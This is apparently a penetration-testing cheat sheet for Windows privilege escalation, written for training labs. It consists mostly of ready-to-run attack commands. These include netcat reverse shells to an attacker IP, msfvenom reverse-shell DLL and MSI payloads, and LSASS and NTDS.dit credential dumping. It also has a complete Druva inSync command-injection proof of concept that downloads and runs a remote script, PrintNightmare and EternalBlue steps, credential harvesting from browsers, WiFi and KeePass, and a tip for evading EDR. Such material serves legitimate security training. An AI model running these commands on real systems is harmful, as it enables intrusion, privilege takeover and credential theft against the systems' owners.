---
title: "Windows PrivEsc"
description: "UAC bypass, token impersonation, services, and AlwaysInstallElevated."
sidebar:
  order: 3
  label: "Windows PrivEsc"
---
> Windows privilege escalation: token privilege abuse, privileged groups, misconfigured services, kernel exploits, and cleartext credential hunting.

---


## Initial Enumeration

```powershell
# Situational awareness
systeminfo
hostname; whoami; whoami /priv; whoami /groups
net user; net user USERNAME; net localgroup
net localgroup Administrators

# Processes and services
tasklist /svc
Get-Process | Select-Object Name, Id, Path

# Installed patches
wmic qfe get Caption,Description,HotFixID,InstalledOn
Get-HotFix | ft -AutoSize

# Network
ipconfig /all; netstat -ano; arp -a

# Installed software
wmic product get name
Get-ChildItem 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall' |
  Get-ItemProperty | Select-Object DisplayName,DisplayVersion

# AppLocker and Defender
Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections
Get-MpComputerStatus
```

```cmd
:: Classic CMD tools
set                            # environment variables
net accounts                   # password policy
echo %PATH%                    # current PATH
findstr /spin "password" *.*   # search for credentials in files
```

---

## Key Privileges — Table

| Privilege | Exploitation Technique |
|------------|----------------------|
| `SeImpersonatePrivilege` | PrintSpoofer (Win10/2019+), JuicyPotato (2016-) |
| `SeDebugPrivilege` | ProcDump lsass → Mimikatz |
| `SeBackupPrivilege` | Copy NTDS.dit + SYSTEM hive → secretsdump |
| `SeTakeOwnershipPrivilege` | takeown + icacls → modify service executable |
| `SeLoadDriverPrivilege` | Capcom.sys → EoPLoadDriver + ExploitCapcom |
| `SeRestorePrivilege` | Restore system files, DLL hijacking |

---

## SeImpersonatePrivilege → SYSTEM

### PrintSpoofer (Windows 10 / Server 2019+)

```powershell
# Verify privilege
whoami /priv   # → SeImpersonatePrivilege: Enabled

# Escalate to SYSTEM
.\PrintSpoofer.exe -c "nc.exe OUR_IP 8443 -e cmd"
.\PrintSpoofer.exe -i -c powershell.exe   # interactive shell
```

### JuicyPotato (Windows Server 2016 and earlier)

```cmd
JucyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe ^
  -a "/c nc.exe OUR_IP 8443 -e cmd.exe" -t *
:: -l local COM port | -t * = CreateProcessWithToken + CreateProcessAsUser
```

### RoguePotato / SweetPotato (Modern Alternatives)

```powershell
.\RoguePotato.exe -r OUR_IP -e "nc.exe OUR_IP 8443 -e cmd.exe" -l 9999
```

---

## SeDebugPrivilege → Dumping LSASS

```cmd
:: Using ProcDump (Sysinternals, not easily detected by AV)
procdump.exe -accepteula -ma lsass.exe lsass.dmp

:: Dump with Task Manager: Details → lsass.exe → create dump
```

```powershell
# Load dump in Mimikatz (on our machine or locally)
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

---

## SeBackupPrivilege → NTDS.dit

```powershell
# Method 1: Copy-FileSeBackupPrivilege (requires SeBackupPrivilege module)
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll

# Create shadow copy with diskshadow
diskshadow.exe
  set verbose on
  set metadata C:\Windows\Temp\meta.cab
  set context clientaccessible
  begin backup
  add volume C: alias cdrive
  create
  expose %cdrive% E:
  end backup
  exit

# Copy NTDS.dit from the shadow copy
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit

# Or with robocopy (/B flag for backup mode)
robocopy /B E:\Windows\NTDS .\ntds ntds.dit

# Save system hives
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV

# Extract hashes (on Kali/Pwnbox)
secretsdump.py -ntds ntds.dit -system SYSTEM.SAV LOCAL
```

---

## SeTakeOwnershipPrivilege → Taking Ownership of a File

```cmd
:: Take ownership
takeown /f "C:\target\sensitive_file.txt"

:: Grant full permissions
icacls "C:\target\sensitive_file.txt" /grant htb-student:F

:: Read the file (e.g., utilman.exe, sethc.exe)
```

---

## Privileged Groups

### Backup Operators → SeBackupPrivilege + SeRestorePrivilege

```powershell
# If the user is a member of Backup Operators:
whoami /groups | findstr "Backup"
# → Use SeBackupPrivilege technique (see above)
```

### DnsAdmins → DLL Injection in DNS (Domain Admin)

```bash
# 1. Generate malicious DLL (on Kali)
msfvenom -p windows/x64/exec \
  cmd='net group "domain admins" netadm /add /domain' \
  -f dll -o adduser.dll

# Or reverse shell:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=OUR_IP LPORT=9001 -f dll -o shell.dll
```

```cmd
:: 2. Load DLL in the DNS server (as a DnsAdmins member)
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll

:: 3. Restart the DNS service (requires permissions, sometimes available)
sc stop dns
sc start dns
```

### Hyper-V Administrators → VM Admin (if the DC is a VM)

```powershell
# Member of Hyper-V Administrators on a host with DC as a VM
# → Full access to DC snapshots → extract NTDS.dit from the snapshot
```

### Print Operators → SeLoadDriverPrivilege → SYSTEM

```powershell
# 1. Enable SeLoadDriverPrivilege (sometimes disabled by default)
#    Use EnableSeLoadDriverPrivilege.ps1 or PrivescCheck.ps1

# 2. Load vulnerable driver Capcom.sys
EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys

# 3. Exploit the driver for a SYSTEM shell
.\ExploitCapcom.exe
```

### Server Operators → Modifying Service binPath

```cmd
:: Change binPath of a service running as SYSTEM
sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
sc start AppReadiness     :: will fail but executes the command

:: Verify
net localgroup Administrators
```

### Event Log Readers → Read Security Logs

```powershell
# Search for credentials in Security logs
wevtutil qe Security /rd:true /f:text | Select-String "/user"
wevtutil qe Security /rd:true /f:text /c:100 | Select-String "pass"

# Confirm membership
net localgroup "Event Log Readers"
```

---

## UAC Bypass — DLL Hijacking

```bash
# 1. Generate reverse shell DLL (on Kali)
msfvenom -p windows/shell_reverse_tcp LHOST=OUR_IP LPORT=8443 \
  -f dll > srrstr.dll
```

```powershell
# 2. Copy DLL to the path loaded by SystemPropertiesAdvanced.exe
#    (before C:\Windows\System32\, searches in user's WindowsApps)
$env:USERNAME  # → get username
# Place in:
# C:\Users\USERNAME\AppData\Local\Microsoft\WindowsApps\srrstr.dll

# 3. Execute the affected binary (32-bit, automatic UAC bypass)
C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe

# → Receive shell as user with elevated token (High Integrity)
```

```powershell
# Alternative: Bypass-UAC.ps1 (sysprep method)
Import-Module .\Bypass-UAC.ps1
Bypass-UAC -Method UacMethodSysprep
```

---

## Vulnerable Services

### Weak Service Permissions (sc config binPath)

```powershell
# 1. Detect with SharpUp
.\SharpUp.exe audit

# 2. Verify permissions with accesschk
accesschk.exe /accepteula -quvcw WindscribeService
# Search for: SERVICE_ALL_ACCESS or SERVICE_CHANGE_CONFIG for our user

# 3. Change binPath
sc config WindscribeService binpath="cmd /c net localgroup administrators USER /add"
sc stop WindscribeService
sc start WindscribeService

# Or reverse shell:
sc config SVC binpath="C:\tools\nc.exe OUR_IP 8443 -e cmd.exe"
sc start SVC
```

### Unquoted Service Paths

```cmd
:: Detect services with unquoted paths containing spaces
wmic service get name,displayname,pathname,startmode ^
  | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """"

:: If path is: C:\Program Files\My Service\svc.exe
:: → Place: C:\Program.exe or C:\Program Files\My.exe (which runs first)
```

### Registry ACL — Weak Permissions on ImagePath

```powershell
# Verify ACLs on service registry keys
Get-ACL -Path "HKLM:\System\CurrentControlSet\Services\SERVICENAME" | fl

# If we have write access:
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Services\SERVICENAME" `
  -Name ImagePath -Value "cmd /c net localgroup administrators USER /add"
sc start SERVICENAME
```

### Vulnerable Services (Third-party) — Druva inSync

```powershell
# Druva inSync 6.6.3 → command injection via RPC on port 6064
netstat -ano | findstr 6064   # confirm that service is listening

# PowerShell PoC (modify $cmd at will)
$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://OUR_IP/shell.ps1')"
$s = New-Object System.Net.Sockets.Socket(
     [System.Net.Sockets.AddressFamily]::InterNetwork,
     [System.Net.Sockets.SocketType]::Stream,
     [System.Net.Sockets.ProtocolType]::Tcp)
$s.Connect("127.0.0.1", 6064)
$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd")
$length = [System.BitConverter]::GetBytes($command.Length)
$s.Send($header); $s.Send($rpcType); $s.Send($length); $s.Send($command)
```

---

## Kernel Exploits

### HiveNightmare / SeriousSAM (CVE-2021-36934) — Win10

```cmd
:: Verify permissions on SAM (normal users should not have access)
icacls c:\Windows\System32\config\SAM
:: If it shows BUILTIN\Users:(I)(RX) → vulnerable

:: Exploit (extracts shadow copies of SAM, SYSTEM, SECURITY)
.\HiveNightmare.exe

:: Extract hashes (on Kali)
impacket-secretsdump -sam SAM-2021-08-07 -system SYSTEM-2021-08-07 ^
  -security SECURITY-2021-08-07 local
```

### PrintNightmare (CVE-2021-1675) — Windows Universal

```powershell
# Verify that Spooler is active
ls \\localhost\pipe\spoolss   # → if it exists, Spooler is running

# Exploit (add local admin user)
Import-Module .\CVE-2021-1675.ps1
Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintIt"

# Verify
net user hacker
net localgroup administrators
```

### MS17-010 EternalBlue (CVE-2017-0144) — Unpatched Win7/2008

```bash
# From Metasploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS TARGET_IP
set LHOST OUR_IP
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run
```

### CVE-2020-0668 — Windows Service Tracing (Win7–Win10 pre-2004)

```bash
# PoC: https://github.com/itm4n/CVE-2020-0668
# Escalates an arbitrary executable to SYSTEM via symbolic link attack
# Use with an executable that adds a user to the Admins group
```

---

## Credential Hunting

### PowerShell History

```powershell
# Locate history file
(Get-PSReadLineOption).HistorySavePath
# → C:\Users\USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Read history of current user
gc (Get-PSReadLineOption).HistorySavePath

# Read of all users (as admin)
foreach($user in ((ls C:\users).fullname)){
    cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue
}
```

### Search for Passwords in Files

```cmd
:: Search for "password" in text/config files
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml

:: General recursive search
findstr /spin "password" *.*

:: Search for files by name
dir /S /B *pass*.txt == *pass*.xml == *cred* == *vnc* == *.config*
where /R C:\ *.config
```

```powershell
# PowerShell — search in content
Select-String -Path C:\Users\*\Documents\*.txt -Pattern password -ErrorAction SilentlyContinue

# Search by extension
Get-ChildItem C:\ -Recurse -Include *.rdp,*.config,*.vnc,*.cred -ErrorAction Ignore
```

### AutoLogon — Credentials in Registry

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
:: Search for: DefaultPassword, DefaultUserName, AutoAdminLogon = 1
```

### PuTTY — Proxy Credentials in Registry

```powershell
reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions
reg query "HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\SESSION_NAME"
# Search for: ProxyUsername, ProxyPassword
```

### WiFi Passwords

```cmd
:: list profiles
netsh wlan show profile
:: show password (Key Content)
netsh wlan show profile "SSID" key=clear
```

### cmdkey — Saved Credentials for RDP

```cmd
cmdkey /list
:: If there are credentials → reuse with runas
runas /savecred /user:DOMAIN\user "cmd.exe"
```

### Unattend.xml — Unattended Installations

```cmd
:: Possible locations
type C:\Windows\Panther\Unattend.xml
type C:\Windows\Panther\Unattend\Unattend.xml
type C:\Windows\setup\scripts\*.xml
:: Search for: <Password><Value>...</Value> (can be plaintext or base64)
```

### StickyNotes — SQLite Database

```powershell
# Locate file
ls C:\Users\*\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\

# Read with PSSQLite
Import-Module .\PSSQLite.psd1
$db = 'C:\Users\USER\AppData\Local\...\LocalState\plum.sqlite'
Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap

# Alternative from Kali: copy plum.sqlite* and use DB Browser for SQLite
# Or: strings plum.sqlite-wal
```

### Chrome Dictionary + Browser Credentials

```powershell
# Chrome dictionary (passwords typed in the browser)
gc 'C:\Users\USER\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password

# Browser credentials with SharpChrome (GhostPack)
.\SharpChrome.exe logins /unprotect
```

### PowerShell Credentials (DPAPI)

```powershell
# If we find a pass.xml or similar
$credential = Import-Clixml -Path 'C:\scripts\pass.xml'
$credential.GetNetworkCredential().username
$credential.GetNetworkCredential().password
```

### KeePass — Extract and Crack

```bash
# Extract hash from .kdbx
python2.7 keepass2john.py file.kdbx > hash.txt

# Crack with hashcat (mode 13400)
hashcat -m 13400 hash.txt /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt
```

### LaZagne — All-in-One

```powershell
.\lazagne.exe all          # all modules
.\lazagne.exe browsers     # browsers only
.\lazagne.exe windows      # Windows internals (DPAPI, Credman, LSA secrets)
.\lazagne.exe -vv          # verbose with details
```

### SessionGopher — PuTTY, WinSCP, RDP, FileZilla

```powershell
Import-Module .\SessionGopher.ps1
Invoke-SessionGopher -Target HOSTNAME
Invoke-SessionGopher -Thorough    # also searches for .ppk, .rdp
```

---

## AlwaysInstallElevated

```cmd
:: Verify both registry keys (both must be 0x1)
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

```powershell
# With PowerUp → generate malicious MSI
Import-Module .\PowerUp.ps1
Write-UserAddMSI    # creates UserAdd.msi in the current directory

# Execute the MSI (prompts for user/password to add to the Admins group)
.\UserAdd.msi
```

```bash
# With msfvenom (MSI payload)
msfvenom -p windows/shell_reverse_tcp LHOST=OUR_IP LPORT=9001 -f msi > shell.msi

# Execute on the target (as normal user → SYSTEM)
msiexec /quiet /qn /i shell.msi
```

---

## Automated Enumeration Tools

```powershell
# winPEAS — complete enumeration
.\winPEASx64.exe
.\winPEASx64.exe quiet         # less output

# SharpUp — focuses on privesc paths
.\SharpUp.exe audit

# PowerUp — pure PowerShell
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# Seatbelt — detailed situational awareness
.\Seatbelt.exe -group=all

# Watson — kernel CVE checker
.\Watson.exe

# WES-NG — from Kali, based on systeminfo
python3 wes.py systeminfo.txt -i "Elevation of Privilege"
```

---

## Citrix / Kiosk Breakout (Summary)

```
1. Open an app that has File → Open (Paint, Notepad, Wordpad)
2. In the dialog box → type the UNC path: \\127.0.0.1\c$\users\USER
3. Execute cmd from SMB share with pwn.exe (binary that calls system("cmd.exe"))
4. Detect AlwaysInstallElevated → PowerUp Write-UserAddMSI → backdoor admin
5. UAC bypass with Bypass-UAC.ps1 -Method UacMethodSysprep
```

---

## Pitfalls / Gotchas

- **PrintSpoofer vs JuicyPotato:** PrintSpoofer works on Win10/Server 2019+. JuicyPotato requires Win Server ≤2016 (the default CLSID does not work on modern versions).
- **SeImpersonate in service context:** the privilege must be *enabled* (`Enabled`), not just present (`Present`). Verify with `whoami /priv`.
- **SeDebugPrivilege + lsass:** in Win10 20H2+ with Credential Guard, lsass will be protected, and Mimikatz will not extract useful credentials from the dump.
- **DnsAdmins:** restarting the DNS service requires having the `SC_MANAGER_ALL_ACCESS` privilege or being a local admin. On DCs, DnsAdmins members can restart it; on standalone servers, not always.
- **HiveNightmare:** only applies to Windows 10 21H1 and earlier (patched by KB5003791). Verify with `winver`.
- **UAC bypass srrstr.dll:** works when the `SystemPropertiesAdvanced.exe` binary looks for `srrstr.dll` in the user's `WindowsApps` folder. The exact path varies by Windows version.
- **Unquoted paths:** exploitation only works if we have write access to the parent directory and the service runs as SYSTEM/privileged.
- **AlwaysInstallElevated:** both HKCU and HKLM registry keys must be set to 1. If only one is configured, it will not work.
- **winPEAS noise:** generates log events (ID 4688, 4703). For stealthy engagements, prefer manual enumeration or smaller scripts.
- **cmdkey /runas:** if the password saved in cmdkey is old or expired, `runas /savecred` will return access denied without a clear error.
- **LaZagne detection:** well known by EDRs. Upload it renamed or use it from memory (IEX + downloadString).
- **Druva inSync 6.6.3:** the path traversal `../../../Windows/System32/cmd.exe` works because the service validates the start of the path but not the exit.

---

## Related Cheatsheets

- [Active Directory Enumeration & Attacks](/en/metodologias/active-directory/active-directory-enumeration-attacks/) — domain escalation once you have local foothold
- [Password Attacks](/en/metodologias/exploitation/password-attacks/) — hashcat, cracking, Pass-the-Hash, PTT
- [File Transfers](/en/metodologias/privesc/file-transfers/) — move winPEAS/SharpUp to the target
- [Shells & Payloads](/en/metodologias/exploitation/shells-payloads/) — reverse shells and payloads for exploits
- [Linux Privilege Escalation](/en/metodologias/privesc/linux-privilege-escalation/) — counterpart on Linux systems
